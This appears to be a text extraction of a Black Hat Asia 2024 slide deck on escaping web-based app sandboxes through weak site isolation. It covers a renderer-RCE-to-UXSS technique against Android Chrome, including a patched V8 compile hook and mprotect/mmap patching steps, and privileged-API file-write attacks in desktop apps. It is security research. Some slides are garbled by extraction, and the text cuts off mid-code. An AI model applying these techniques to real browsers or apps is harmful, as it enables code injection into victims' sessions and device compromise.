---
title: "Isolation Perspective"
speakers: ["Bohan Liu", "Haibin Shi-The Hole in Sandbox Escape Modern Web-Based App Sandbox From Site"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2024"
edition: "ASIA"
year: 2024
source_pdf: "BlackHat ASIA 2024-Slides/Bohan Liu & Haibin Shi-The Hole in Sandbox Escape Modern Web-Based App Sandbox From Site-Isolation Perspective.pdf"
pages: 68
sha256: "341adecf8fa4f1c44c856e556dd5948db53d3442b1155fe3824efa4376fb4958"
text_chars: 43461
ocr_pages: 4
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:48:50Z"
---
# Isolation Perspective

**Speakers:** Bohan Liu, Haibin Shi-The Hole in Sandbox Escape Modern Web-Based App Sandbox From Site  
**Conference:** Black Hat ASIA 2024  
**Source:** `BlackHat ASIA 2024-Slides/Bohan Liu & Haibin Shi-The Hole in Sandbox Escape Modern Web-Based App Sandbox From Site-Isolation Perspective.pdf` (68 pages)


## Slide 1

### The Hole in Sandbox: Escape Modern Web-Based App Sandbox From Site-Isolation Perspective

Bohan Liu,  Haibin Shi Tencent Security Xuanwu Lab

#BHASIA @BlackHatEvents

## Slide 2

##### Who are we

###### Bohan Liu

- @P4nda20371774

- Security Researcher at Tencent Security Xuanwu Lab

- Mainly Engaged in Browser Security

###### Haibin Shi

   - @Aryb1n

   - • Security Researcher at Tencent Security Xuanwu Lab

   - • Android Security

- Google Chrome Bug Hunter

# BHASIA @BlackHatEvents

## Slide 3

## Introduction

# BHASIA @BlackHatEvents

## Slide 4

##### Multi-process Architecture in Chrome

Memory  Rendering Engine
Allocator
DOM CSS
JavaScript
Engine Web APIs Media

https://developer.chrome.com/blog/inside-browser-part1

# BHASIA @BlackHatEvents

## Slide 5

##### Sandbox in Chrome

**Do not re-invent the wheel**

- **Windows:** A restricted token& The Windows job object &

- The Windows desktop object& Integrity levels

   - **Linux:** Seccomp-BPF & User namespaces

- **Android:** SELinux

- **Principle of least privilege**

   - Mandatory access controlled environment

   - Isolated Process when HTML rendering and JavaScript execution

   - Limited resource access

IPC Server IPC IPC Client Memory Rendering Engine Allocator DOM CSS JavaScript Engine Web APIs Media Sandbox

- Limited IPC/kernel interaction access

# BHASIA @BlackHatEvents

## Slide 6

##### The capabilities of renderer RCE

###### **What can attacker do with SHELLCODE:**

1. Invoke **_limited_** system calls and Access **_limited_** resources.

2. Send evil IPC with **_ANY_** arguments.

3. Patch **_ALL_** code in render process.

IPC Server IPC IPC Client Memory Rendering Engine Allocator DOM CSS JavaScript Engine Web APIs Media Sandbox

mprotect /etc/hosts … https://www.blackhat.com/us-22/briefings/schedule/#electrovolt-pwning-popular-desktop-apps-while-uncovering-new-attack-surface-on-electron-26322# BHASIA @BlackHatEvents

## Slide 7

##### The capabilities of renderer RCE

Sandbox Escape

###### **Any other next-steps after renderer rce except Sandbox escape?**

- GPU or network processes RCE

- Universal Cross Site Scripting

Universal XSS
Renderer RCE

https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules

# BHASIA @BlackHatEvents

## Slide 8

## From Renderer RCE to UXSS

# BHASIA @BlackHatEvents

## Slide 9

##### What is UXSS?

###### **XSS  vs  UXSS:**

Web Server
<script>alert(‘xss’);</script>
Evil parameter
Injected on Web Server
victim.com
victim.com
XSS in victim.com

Web Server
UXSS EXP
attacker.com victim.com
<script>alert(‘xss’);</script>
Injected when loading
victim.com
UXSS in Browser

# BHASIA @BlackHatEvents

## Slide 10

##### The History of UXSS

###### **UXSS is a long-standing problem that plagues various browsers.**

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
ASIA 2024
The History of UXSS
UXSS is a long-standing problem that plagues various browsers.
DAV NDS
Universal XSS via IE8s XSS Filters Chrome Releases
Internet Explorer 8 has built in cross-site scripting (XSS) detection and prevention Go e Release updates from the Chrome team
filters. We will explore the details of how the filters detect attacks, the neutering
method, and discuss the filters’ general strengths and weaknesses. We will
demonstrate several ways in which the filters can be abused (not just bypassed)
All UXSS reports per month (years 2014 - 2016)
Chrome Stable Channel Update
6 Thursday, March 8, 20
The Chrome Stable channel has been updated to 17.0.963.78 on Wind Mac, Linux and Chrome Frame. This
release fixes issues with Flash games and videos, along with the security fix listed below.
Security fixes and rewards
Congratulations again to community member Sergey Glazunov for the first submission to Pwnium!
=
-[ IM $60,000] [117226] [117230] Critical CVE-2011-3046: UXSS and bad history
navigation. Credit to Sergey Glazunov
1 g
Please see the Chromium security page for more detail. Note that the referenced bugs may be kept private until a
0
majority of our users are up to date with the fix
12°76
Full details about what changes are in this release are available in the SVN revision log. Interested in hopping on
WebKit the stable channel? Find out how. If you find a new issue, please let us know by filing a bug
Available for: macOS Mojave 10.14.6 and macOS High Sierra 10.13.6, and included in macOS Catalina
1015.1 Jason Kersey
Impact: Processing maliciously crafted web content may lead to universal cross site scripting Google Chrome
Description: A logic issue was addressed with improved state management.
CVE-2019-8813: an anonymous researcher
```

## Slide 11

##### How To UXSS

###### **What stops us from injecting code from other domains?**

```
<!DOCTYPEhtml>
<html>
```

```
<head>
```

```
<title>DEMO</title>
```

- `</head>`

```
<body>
```

```
<iframeid="myFrame"width="500"height="800"
src="https://xlab.tencent.com"></iframe>
```

- `<!-- <iframe id="myFrame" width="500" height="800"`

- `src="test.html"></iframe> -->`

```
<script>
```

Access blocked due to **SOP**

   - `window.addEventListener('load', function() {`

- `var iframe = document.getElementById('myFrame'); var script = document.createElement("script"); script.textContent = "alert('UXSS')"; var iframeObject = iframe.contentWindow; console.log(iframeObject.document.body.appendChild`

- `(script)); });`

```
</script>
```

```
</body>
```

```
</html>
```

# BHASIA @BlackHatEvents

## Slide 12

##### How To UXSS

###### **Same-origin policy (SOP)**

restrict web pages from making requests to a different domain than the one that served the original web page.

- **Protocol (Scheme):** The protocol (HTTP or HTTPS) of the two origins must be the same.

- **Domain:** The domain of the two origins must be the same.

- **Port:** If a port is specified in the URL, it must be the same for both origins.

Access blocked due to **SOP**

**How to bypass SOP?**

# BHASIA @BlackHatEvents

## Slide 13

##### Case Study: SOP Bypass via Renderer RCE in Safari

**Forget the Sandbox Escape:** Abusing Browsers from Code Execution  - Amy Burnett - BlueHatIL 2020

•
Condition 1: The attacker’s Page and the victim iframe in the same renderer.
•
Condition 2: The Check Code in the renderer process.
•
Condition 3: Domain structure used by Check Code also in the process. Parent Page:
https://attacker.com
=> Modify data in Renderer Process to bypass check. bool{ DOMWindow::isInsecureScriptAccess(DOMWindow& activeWindow, const String& urlString)
//[...]
if (activeWindow.document()->securityOrigin().canAccess(document()->securityOrigin()))
return false;
1. Iframe Page: //[...]printErrorMessage(crossDomainAccessErrorMessage(...));
Overwrite   m_universalAccess  in SecurityOrigin of the domain
} https://google.com
->  bypass Check of Cross-domain data access
bool FrameLoader::shouldInterruptLoadForXFrameOptions(...)
{
-> Inject XSS payload into iframe //[...]
XFrameOptionsDisposition disposition = parseXFrameOptionsHeader(content);
switch (disposition) {
case XFrameOptionsSameOrigin: {
2. // Check if the parent is the same origin
Overwrite protocol, host, port in SecurityOrigin of the domain
if (!origin->isSameSchemeHostPort(topFrame.document()->securityOrigin()))
return true;
-> bypass X-Frame-Options return false;
}
case XFrameOptionsDeny:
// Always interrupt load
-> Make any site can be loaded in iframe return true;
//[...]
}

# BHASIA @BlackHatEvents

https://msrndcdn360.blob.core.windows.net/bluehat/bluehatil/2022/assets/doc/Forget%20the%20Sandbox%20Escape%20Abusing%20Browsers%20from%20Code%20Execution.pdf

## Slide 14

##### Case Study: SOP Bypass via Renderer RCE in Safari

**Forget the Sandbox Escape:** Abusing Browsers from Code Execution  - Amy Burnett - BlueHatIL 2020

- **Condition 1: The attacker’s Page and the victim iframe are in the same renderer.**

- **Condition 2: The Check Code (such as SOP) is in the renderer process.**

- **Condition 3: Domain structure used by Check Code is also in the process.**

- **=> Modify data in Renderer Process to bypass check.**

```
boolDOMWindow::isInsecureScriptAccess(DOMWindow&activeWindow, constString&urlString)
{
```

```
//[...]
```

```
if(activeWindow.document()->securityOrigin().canAccess(document()->securityOrigin()))
returnfalse;
```

1. Overwrite **_m_universalAccess_** in SecurityOrigin of the domain

```
//[...]
printErrorMessage(crossDomainAccessErrorMessage(...));
}
```

- ->  bypass Check of Cross-domain data access

   - -> Inject XSS payload into iframe

```
boolFrameLoader::shouldInterruptLoadForXFrameOptions(...)
{
```

```
//[...]
```

```
XFrameOptionsDispositiondisposition = parseXFrameOptionsHeader(content);
```

```
switch(disposition) {
```

2. Overwrite protocol, host, port in SecurityOrigin of the domain

   - -> bypass X-Frame-Options

      - -> Make any site can be loaded in iframe

```
caseXFrameOptionsSameOrigin: {
```

```
// Check if the parent is the same origin
```

```
if(!origin->isSameSchemeHostPort(topFrame.document()->securityOrigin()))
returntrue;
```

```
returnfalse;
```

```
}
caseXFrameOptionsDeny:
```

```
// Always interrupt load
returntrue;
```

```
//[...]
```

```
}
```

https://msrndcdn360.blob.core.windows.net/bluehat/bluehatil/2022/assets/doc/Forget%20the%20Sandbox%20Escape%20Abusing%20Browsers%20from%20Code%20Execution.pdf

# BHASIA @BlackHatEvents

## Slide 15

##### UXSS Harden in Chrome

**Forget the Sandbox Escape:** Abusing Browsers from Code Execution  - Amy Burnett - BlueHatIL 2020

- **Condition 1: The attacker’s Page and the victim iframe are in the same renderer.**

- **Condition 2: The Check Code (such as SOP) is in the renderer process.**

- **Condition 3: Domain structure used by Check Code is also in the process.**

###### **=> Modify data in Renderer Process to bypass check.**

###### **Out-of-Process iframes (OOPIFs)**

- Allow **a child frame** of a page to be rendered by a **different process** than

its parent frame

- Kill **Condition 1**

###### **Site Isolation**

- Limits **each renderer process** to

- documents from **a single site** .

- The **most promising countermeasure** against UXSS attacks.

**2017.10 2017.02 PlzNavigate 2018.07** • Move cross-origin security checks to

   - **Browser** Process.

- Kill **Condition 2 & 3**

https://research.google/pubs/analysis-of-uxss-exploits-and-mitigations-in-chromium/

# BHASIA @BlackHatEvents

## Slide 16

http://attacker.com **iframe**

##### What is Site Isolation?

**principle:**

Treats **each web site** as a separate security principal **requiring a dedicated renderer** process.

###### **What’s new:**

http://vicitm.com
1. <iframe src="http://vicitm.com"></iframe>
2.  window.open(“http://vicitm.com”)

Tab/Window A http://attacker.com http://victim.com
Same Process Process A Process B

- Site Principals

**Process-Per-Tab Model Site Isolation Model Out-of-process iframes**

- Dedicated Processes

- **Cross-Process Navigations**

- **Out-of-process iframes**

- Cross-Origin Read Blocking

http://attacker.com http:// victim.com
location.href=“http://victim.com”>
Tab/Window A http://attacker.com http://victim.com
Same Process Process A Process B
Process-Per-Tab Model Site Isolation Model
Cross-Process Navigations # BHASIA @BlackHatEvents

https://www.usenix.org/system/files/sec19-reis.pdf

## Slide 17

##### How is Site Isolation implemented?

**How to trace code ?** → NavigationRequest::StartNavigation

```
voidNavigationRequest::StartNavigation() {
// [...]
```

```
if(associated_rfh_type_ != AssociatedRenderFrameHostType::NONE) {
RenderFrameHostImpl* navigating_frame_host=
```

```
associated_rfh_type_ == AssociatedRenderFrameHostType::SPECULATIVE
```

- `? frame_tree_node_->render_manager()->speculative_frame_host()`

```
: frame_tree_node_->current_frame_host();
SetExpectedProcess(navigating_frame_host->GetProcess());
```

```
}
// [...]
}
```

# BHASIA @BlackHatEvents

## Slide 18

`RenderFrameHostManager::GetFrameHostForNavigation( NavigationRequest* request, BrowsingContextGroupSwap* browsing_context_group_swap, std::string* reason) {` How is Site Isolation implemented?

```
SiteInstanceImpl* current_site_instance=
```

```
render_frame_host_->GetSiteInstance();
```

**How to trace code ?** → NavigationRequest::StartNavigation

```
boolis_same_site=
```

```
render_frame_host_->IsNavigationSameSite(request->GetUrlInfo());
```

```
IsSameSiteGetteris_same_site_getter(is_same_site);
scoped_refptr<SiteInstanceImpl> dest_site_instance=
GetSiteInstanceForNavigationRequest(request, is_same_site_getter,
browsing_context_group_swap, reason);
```

```
IsSameSiteGetteris_same_site_getter(is_same_site);
voidNavigationRequest::StartNavigation() {
scoped_refptr<SiteInstanceImpl> dest_site_instance=
// [...]GetSiteInstanceForNavigationRequest(request, is_same_site_getter,
if(associated_rfh_type_ != AssociatedRenderFrameHostType::NONE) {
RenderFrameHostImpl* navigating_frame_host=
// A subframe should always be in the same BrowsingInstance
associated_rfh_type_ == AssociatedRenderFrameHostType::SPECULATIVE// (see also https://crbug.com/1107269).
? frame_tree_node_->render_manager()->speculative_frame_host()RenderFrameHostImpl* parent = frame_tree_node_->parent();
DCHECK(!parent ||
```

```
// A subframe should always be in the same BrowsingInstanceas the parent
// (see also https://crbug.com/1107269).
```

```
: frame_tree_node_->current_frame_host();
```

```
dest_site_instance->IsRelatedSiteInstance(parent->GetSiteInstance()));
```

```
SetExpectedProcess(navigating_frame_host->GetProcess());
```

```
}
// [...]
}
```

```
// The SiteInstancedetermines whether to switch RenderFrameHostor not.
booluse_current_rfh=current_site_instance== dest_site_instance;
//[...]
//[...]
if(use_current_rfh) {
```

```
request->SetAssociatedRFHType(
```

```
NavigationRequest::AssociatedRenderFrameHostType::CURRENT);
//[...]
} else{
//[...]
```

```
navigation_rfh= speculative_render_frame_host_.get();
request->SetAssociatedRFHType(
```

```
NavigationRequest::AssociatedRenderFrameHostType::SPECULATIVE);
//[...]
```

```
}
//[...]
```

# BHASIA @BlackHatEvents

## Slide 19

`RenderFrameHostManager::GetFrameHostForNavigation( NavigationRequest* request, BrowsingContextGroupSwap* browsing_context_group_swap, std::string* reason) {` How is Site Isolation implemented?

```
SiteInstanceImpl* current_site_instance=
scoped_refptr<SiteInstanceImpl> BrowsingInstance::GetSiteInstanceForURLHelper(
render_frame_host_->GetSiteInstance();
```

`const UrlInfo& url_info, bool is_same_site =` **How to trace code ?** → NavigationRequest::StartNavigation `bool allow_default_instance) { render_frame_host_->IsNavigationSameSite(request->GetUrlInfo()); const SiteInfo site_info = ComputeSiteInfoForURL(url_info); auto i = site_instance_map_.find(site_info); IsSameSiteGetter is_same_site_getter(is_same_site); void NavigationRequest::StartNavigation() {if (i != site_instance_map_.end()) scoped_refptr<SiteInstanceImpl>` **`dest_site_instance`** `= // [...] return i->second; GetSiteInstanceForNavigationRequest(request, is_same_site_getter, if (associated_rfh_type_ != AssociatedRenderFrameHostType::NONE) { browsing_context_group_swap, reason); // Check to see if we can use the default SiteInstance for sites that don't` **`RenderFrameHostImpl`** `// need to be isolated in their own process.* navigating_frame_host = // A subframe should always be in the same BrowsingInstance as the parent associated_rfh_type_ == AssociatedRenderFrameHostType::SPECULATIVEif (allow_default_instance && // (see also https://crbug.com/1107269).` **`SiteInstanceImpl::CanBePlacedInDefaultSiteInstance(`** `? frame_tree_node_->render_manager()->speculative_frame_host()RenderFrameHostImpl* parent = frame_tree_node_->parent();` **`isolation_context_, url_info.url, site_info))`** `{ DCHECK(!parent || scoped_refptr<SiteInstanceImpl> site_instance: frame_tree_node_->current_frame_host();= dest_site_instance->IsRelatedSiteInstance(parent->GetSiteInstance())); SetExpectedProcess(navigating_frame_host->GetProcess());default_site_instance_.get(); if (!site_instance) { } // The SiteInstance determines whether to switch RenderFrameHost or not. site_instance = new SiteInstanceImpl(this); bool use_current_rfh =` **`current_site_instance == dest_site_instance`** `; // [...] //[...] } // Note: |default_site_instance_| will get set inside this call//[...]`

- `// via RegisterSiteInstance().`

```
if(use_current_rfh) {
request->SetAssociatedRFHType(
```

```
site_instance->SetSiteInfoToDefault(site_info.storage_partition_config());
DCHECK_EQ(default_site_instance_, site_instance.get());
}
```

```
NavigationRequest::AssociatedRenderFrameHostType::CURRENT);
//[...]
// Add |site_info| to the set so we can keep track of all the sites the
} else{
// the default SiteInstancehas been returned for.
//[...]
site_instance->AddSiteInfoToDefault(site_info);
navigation_rfh= speculative_render_frame_host_.get();
returnsite_instance;
request->SetAssociatedRFHType(
NavigationRequest::AssociatedRenderFrameHostType::SPECULATIVE);
//[...]
returnnullptr;;
}
//[...]
```

```
// the default SiteInstancehas been returned for.
site_instance->AddSiteInfoToDefault(site_info);
returnsite_instance;
}
returnnullptr;;
}
```

# BHASIA @BlackHatEvents

## Slide 20

```
// static
```

```
boolSiteIsolationPolicy::UseDedicatedProcessesForAllSites() {
if(base::CommandLine::ForCurrentProcess()->HasSwitch(
switches::kSitePerProcess)) {
returntrue;
```

##### How is Site Isolation implemented?

```
}
```

**When to reuse SiteInstance?**

```
if (IsSiteIsolationDisabled(SiteIsolationMode::kStrictSiteIsolation))
return false;
```

- `bool SiteInfo::RequiresDedicatedProcess( const IsolationContext& isolation_context) const {`

- `DCHECK_CURRENTLY_ON(BrowserThread::UI);`

```
DCHECK(isolation_context.browser_or_resource_context());
```

```
}
```

```
// The switches above needs to be checked first, because if the
// ContentBrowserClientconsults a base::Feature, then it will activate the
// field trial and assigns the client either to a control or an experiment
// group -such assignment should be final.
```

```
returnGetContentClient() &&
```

```
GetContentClient()->browser()->ShouldEnableStrictSiteIsolation();
```

- `// If --site-per-process is enabled, site isolation is enabled`

- `everywhere.`

   - `if (SiteIsolationPolicy::` **`UseDedicatedProcessesForAllSites`** `()) return true;`

```
// [...]
```

- `return false;`

```
}
```

# BHASIA @BlackHatEvents

## Slide 21

`// static bool SiteIsolationPolicy::UseDedicatedProcessesForAllSites() { if (base::CommandLine::ForCurrentProcess()->HasSwitch( switches::kSitePerProcess)) { return true;` How is Site Isolation implemented? `}` **When to reuse SiteInstance?** `if (` **`IsSiteIsolationDisabled(SiteIsolationMode::kStrictSiteIsolation)`** `) return false; // The switches above needs to be checked first, because if the bool SiteInfo::RequiresDedicatedProcess( // ContentBrowserClient consults a base::Feature, then it will activate the // field trial and assigns the client either to a control or an experiment const IsolationContext& isolation_context) const { // group - such assignment should be final. DCHECK_CURRENTLY_ON(BrowserThread::UI); return GetContentClient() && DCHECK(isolation_context.browser_or_resource_context()); GetContentClient()->browser()->` **`ShouldEnableStrictSiteIsolation()`** `; } // If --site-per-process is enabled, site isolation is enabled everywhere. if (SiteIsolationPolicy::` **`UseDedicatedProcessesForAllSites`** `()) return true; // [...] return false; bool ContentBrowserClient::ShouldEnableStrictSiteIsolation() { } #if` **`BUILDFLAG(IS_ANDROID)`** `return false; #else return true; #endif }`

# BHASIA @BlackHatEvents

## Slide 22

`// static bool SiteIsolationPolicy::UseDedicatedProcessesForAllSites() { if (base::CommandLine::ForCurrentProcess()->HasSwitch( switches::kSitePerProcess)) { return true;` How is Site Isolation implemented? `}` **When to reuse SiteInstance?** `if (` **`IsSiteIsolationDisabled(SiteIsolationMode::kStrictSiteIsolation)`** `) return false; // The switches above needs to be checked first, because if the bool SiteInfo::RequiresDedicatedProcess( // ContentBrowserClient consults a base::Feature, then it will activate the // field trial and assigns the client either to a control or an experiment const IsolationContext& isolation_context) const { // group - such assignment should be final. DCHECK_CURRENTLY_ON(BrowserThread::UI); return GetContentClient() && DCHECK(isolation_context.browser_or_resource_context()); GetContentClient()->browser()->` **`ShouldEnableStrictSiteIsolation()`** `; } // If --site-per-process is enabled, site isolation is enabled everywhere. if (SiteIsolationPolicy::` **`UseDedicatedProcessesForAllSites`** `()) return true; // [...] return false; bool ContentBrowserClient::ShouldEnableStrictSiteIsolation() { }`

```
boolContentBrowserClient::ShouldEnableStrictSiteIsolation() {
#if BUILDFLAG(IS_ANDROID)
returnfalse;
#else
returntrue;
#endif
}
```

**We can reuse the same process after navigation in Android!!!**

# BHASIA @BlackHatEvents

## Slide 23

##### From Renderer RCE to UXSS in Android

###### **The way to inject JavaScript into another page**

**What we have:**

- The ability to patch all the code segment or modify data based on the Renderer RCE

- The victim page could be in the same process we control

###### **When to inject :**

- DOM Tree Building

- JavaScript Compilation

- JavaScript Code Execution

# BHASIA @BlackHatEvents

## Slide 24

##### From Renderer RCE to UXSS in Android

###### **Hook the code of JavaScript Compilation**

```
v8::MaybeLocal<v8::Script> CompileScriptInternal(
```

```
v8::Isolate*isolate,
ScriptState*script_state,
```

```
MaybeLocal<Script> ScriptCompiler::Compile(Local<Context> context,
```

```
Source* source,
CompileOptionsoptions,
```

```
NoCacheReasonno_cache_reason) {
```

```
Utils::ApiCheck(
```

```
!source->GetResourceOptions().IsModule(), "v8::ScriptCompiler::Compile",
"v8::ScriptCompiler::CompileModulemust be used to compile modules");
autoi_isolate= context->GetIsolate();
```

```
MaybeLocal<UnboundScript> maybe =
```

```
CompileUnboundInternal(i_isolate, source, options, no_cache_reason);
Local<UnboundScript> result;
```

```
if(!maybe.ToLocal(&result)) returnMaybeLocal<Script>();
v8::Context::Scope scope(context);
```

```
returnresult->BindToCurrentContext();
```

```
}
```

**Hook**

```
constClassicScript&classic_script,
```

```
v8::ScriptOriginorigin,
```

```
v8::ScriptCompiler::CompileOptionscompile_options,
```

```
v8::ScriptCompiler::NoCacheReasonno_cache_reason,
```

```
std::optional<inspector_compile_script_event::V8ConsumeCacheResult>*
cache_result) {
```

```
v8::Local<v8::String> code = V8String(isolate, classic_script.SourceText());
```

```
// TODO(kouhei): Plumb the ScriptStateinto this function and replace all
// Isolate->GetCurrentContextin this function with ScriptState->GetContext.
if(ScriptStreamer* streamer = classic_script.Streamer()) {
```

```
if(v8::ScriptCompiler::StreamedSource* source =
```

```
streamer->Source(v8::ScriptType::kClassic)) {
```

```
// Final compile call for a streamed compilation.
// Streaming compilation may involve use of code cache.
// TODO(leszeks): Add compile timer to streaming compilation.
returnv8::ScriptCompiler::Compile(script_state->GetContext(), source,
code, origin);
```

```
}
}
//[...]
}
```

# BHASIA @BlackHatEvents

## Slide 25

##### From Renderer RCE to UXSS in Android

###### **Hook the code of JavaScript Compilation**

```
v8::MaybeLocal<v8::Script> CompileScriptInternal(
v8::Isolate*isolate,
ScriptState*script_state,
```

```
MaybeLocal<Script> ScriptCompiler::Compile(Local<Context> context,
Source* source,
CompileOptionsoptions,
NoCacheReasonno_cache_reason) {
```

```
Utils::ApiCheck(
```

```
!source->GetResourceOptions().IsModule(), "v8::ScriptCompiler::Compile",
"v8::ScriptCompiler::CompileModulemust be used to compile modules");
autoi_isolate= context->GetIsolate();
```

```
MaybeLocal<UnboundScript> maybe =
```

```
CompileUnboundInternal(i_isolate, source, options, no_cache_reason);
Local<UnboundScript> result;
if(!maybe.ToLocal(&result)) returnMaybeLocal<Script>();
inlinev8::Context::Sv8::Locope scope(context);al<v8::String> Evil_V8String(v8::Isolate*isolate,
returnresult->BindToCurrentContext();constParkableString&string)
```

```
}
{
```

```
if(some_special_condition){
return V8String(isolate, "alert('pwned')");
}else{
returnV8String(isolate, string);
}
}
```

```
constClassicScript&classic_script,
v8::ScriptOriginorigin,
v8::ScriptCompiler::CompileOptionscompile_options,
```

```
v8::ScriptCompiler::NoCacheReasonno_cache_reason,
```

```
std::optional<inspector_compile_script_event::V8ConsumeCacheResult>*
cache_result) {
```

```
v8::Local<v8::String> code = V8String(isolate, classic_script.SourceText());Evil_V8String(isolate, classic_script.SourceText());
```

```
// TODO(kouhei): Plumb the ScriptStateinto this function and replace all
// Isolate->GetCurrentContextin this function with ScriptState->GetContext.
if(ScriptStreamer* streamer = classic_script.Streamer()) {
if(v8::ScriptCompiler::StreamedSource* source =
```

```
streamer->Source(v8::ScriptType::kClassic)) {
// Final compile call for a streamed compilation.
// Streaming compilation may involve use of code cache.
// TODO(leszeks): Add compile timer to streaming compilation.
returnv8::ScriptCompiler::Compile(script_state->GetContext(), source,
code, origin);
```

```
}
}
//[...]
}
```

# BHASIA @BlackHatEvents

## Slide 26

##### From Renderer RCE to UXSS in Android

###### **Hook the code of JavaScript Compilation**

1

2

3

4

```
Victims open
attackers’ site
```

###### **`Patch the code Via Renderer RCE`**

###### **`Navigate to the victim site`**

###### **`Trigger UXSS when loading`**

`1. Find the` **`base address`** `of chrome.so`

`2. Call mprotect to set the code segment as` **`rwx`** `.`

`1. Clear Context.`

`2. Reset` **`location.href`**

   `1. Choose a good time to inject JavaScript code Using some_special_condition.`

   `2. Enjoy your` **`UXSS!`**

`3. Call mmap to allocate a code space to deploy the Evil_V8String.`

`4. Patch the code in` **`CompileScriptInternal`** `.`

# BHASIA @BlackHatEvents

## Slide 27

##### From Renderer RCE to UXSS in Android **Demo: Chrome For Android 90.0.4430.61**

**Issues 40070451: Security: Site Isolation for Android doesn't isolate all sites** **<u>(https://issues.chromium.org/issues/40070451)</u>**

Sandbox Escape
Universal XSS
Renderer RCE

# BHASIA @BlackHatEvents

## Slide 28

##### From Renderer RCE to UXSS in Android

###### **However …**

- there's not much we can do here until we can get site isolation fully up on Android.

- Use heuristics to isolate the sites that need it most.

**We Can’t inject JavaScript into** _account.google.com_ **after Chrome 92.**

# BHASIA @BlackHatEvents

## Slide 29

##### From Renderer RCE to UXSS in Android

###### **What are the sites that need isolation most?**

- sites where users log in by entering a password

- sites with the industry-standard OAuth protocol

- sites with Cross-Origin-Opener-Policy (COOP) response header

Site isolation mainly protects **private data related to user login** , just as it was originally launched for side-channel attacks like Specter.

**What other unprotected but equally dangerous sites are there?**

https://security.googleblog.com/2021/07/protecting-more-with-site-isolation.html

# BHASIA @BlackHatEvents

## Slide 30

##### From Renderer RCE to UXSS in Android **What are the sites that need isolation most?**

- sites where users log in by entering a password

- sites with the industry-standard OAuth protocol

- sites with Cross-Origin-Opener-Policy (COOP) response header

Site isolation mainly protects **private data related to user login** , just as it was originally launched for side-channel attacks like Specter.

**What other unprotected but equally dangerous sites are there?**

**From the perspective of Android Chrome developers, just protecting these sites is enough, but …**

**There is a category of apps called Web-based App,  implemented by Browser components using Chromium.**

**Usually Web-based App has more complex functions. Could these apps have survived using similar protection?**

https://security.googleblog.com/2021/07/protecting-more-with-site-isolation.html

# BHASIA @BlackHatEvents

## Slide 31

#### Examining Web-based App Design From Site Isolation Perspective

# BHASIA @BlackHatEvents

## Slide 32

##### The Design of Web-based App **Why web-based App?**

- Multi-platform design can be completely consistent

- Easily update content

- Low development costs

- Some other benefits…

In short, we have found that many software includes components for displaying web content.

# BHASIA @BlackHatEvents

## Slide 33

The Design of Web-based App **But sometimes just showing is not enough…**

- We may want to check if the user has installed a certain app and its version

- We may want to check if the user's other software is in login mode

- And some other **native capabilities** beyond web capabilities …

Until the emergence of **JavaScript Interface** , it was possible to invoke user native capabilities from the web side.

# BHASIA @BlackHatEvents

## Slide 34

The Design of Web-based App Some JavaScript interfaces actually implement quite powerful functions:

- Open native application

- Execute commands on user devices

- Installing applications on user devices

- etc.

we called them **privileged APIs.** If we can also call these APIs in our web pages, it is possible to achieve **sandbox escape** effects!

But developers also came up with this, thus limiting the use of these privileged APIs to only websites they trust:

If(checkUrlIfTrusted(url)) { privilegedAPI(); } else { alert(“Ooooops”); }

It seems that this kind of inspection is very comprehensive.

# BHASIA @BlackHatEvents

## Slide 35

##### The Design of Web-based App

**Is it possible to break the security assumption of trusted domain checks + privileged APIs?** The prerequisite for security is that “ **the domain name that can be checked is trustworthy and not malicious** ”

If we assume that the manufacturer protects the domain name they trust well, is this considered secure?

In a perfect site isolation (i.e. Full site isolation), there is indeed no way to do so without breaking through the sandbox.

**In reality, is the site isolation in Web based apps really as perfect as developers imagine?**

# BHASIA @BlackHatEvents

## Slide 36

##### The Design of Web-based App **But if real-world software has perfect site isolation ?**

Due to compromises in performance and other aspects, many web-based applications are **deficient in the implementation of site isolation.**

In apps that do not implement Full site isolation, we may use the UXSS solution to call any privileged API to achieve the effect of **sandbox escape.**

Let’s show the design and attack methods in different types of apps in turn.

**Sandbox Escape Universal XSS Renderer RCE**

# BHASIA @BlackHatEvents

## Slide 37

Escape Modern Web-Based App Sandbox From SiteIsolation Perspective

# BHASIA @BlackHatEvents

## Slide 38

##### The Apps we care

- Web-based APP on PC

   - -> e.g. PC Application based CEF

- Mobile Browser

   - -> e.g. The default browser for mobile phone

- Android App based WebView

   - -> e.g. The App Store for mobile phone

# BHASIA @BlackHatEvents

## Slide 39

#### Type 1: PC Application based CEF

# BHASIA @BlackHatEvents

## Slide 40

##### Web-based APP on PC

###### **How to develop a Web-based APP on PC?**

Trusted sites Cache file
Provide data for display
Local Resource store data Temporarily Database
html、JavaScript
Resource Render Local storage
（ privileged domain ） （ offline functions, accelerate ）
Parse and locate
local resources
Asynchronous data
Trigger client  transfer
behavior
…
Register Privileged API Browser Component Other
Export  JS object （ Webview 、 libcef 、 electron… ） （ Non-browser display interface ）
1. Privileged API code mainly implements the common functions of the clientExtra features
Register privileged domains
Privileged API
Process parsing
Privileged domain
Domain check  resolution
JAVA / C++ / nodejs
…
2. Many implicit deeplinks are registered in Privileged domain resolution
Client function Remote storage
（ client logic ） （ Real storage ）
Client Behavior
（ upload/download
/open… ） # BHASIA @BlackHatEvents

# BHASIA @BlackHatEvents

## Slide 41

##### Web-based APP on PC

###### **The weakness in Web-based APP on PC?**

**1. Stability**

**2. Running speed**

**3. Good user experience**

What Can be optimized in Web-based APP ?

(Optimizing chrome itself is difficult, it is better to optimize the process of loading pages)

**1. When the APP opening** : A renderer process is created in the background.

**2. When clicking a URL** : Display the window of renderer process and navigate to the URL.

**3. When closing the Website** : Hide the window and navigate to _about:blank._

_: Save the overhead of startup and destruction!_

_: Kill the site isolation, we can get UXSS in privileged domain!_

# BHASIA @BlackHatEvents

## Slide 42

##### Web-based APP on PC

**Find More bugs in privileged API**

**Privileged_API. cryptoAPI.decrypt(key,input,output,cb)**

Unverified input file source: **UNC?**

Path traversal when writing files: **../../X.exe?**

**Write any value to any file**

**Privileged_API.StartX.start()** CreateProcess(“”, “X.exe”,Null, …); **Start an executable file**

###### **Remote Code Execution**

```
BOOL decrypt(constwchar_t*inputFilePath, constwchar_t*
outputFilePath, constchar*key, Function *cb)
{
```

```
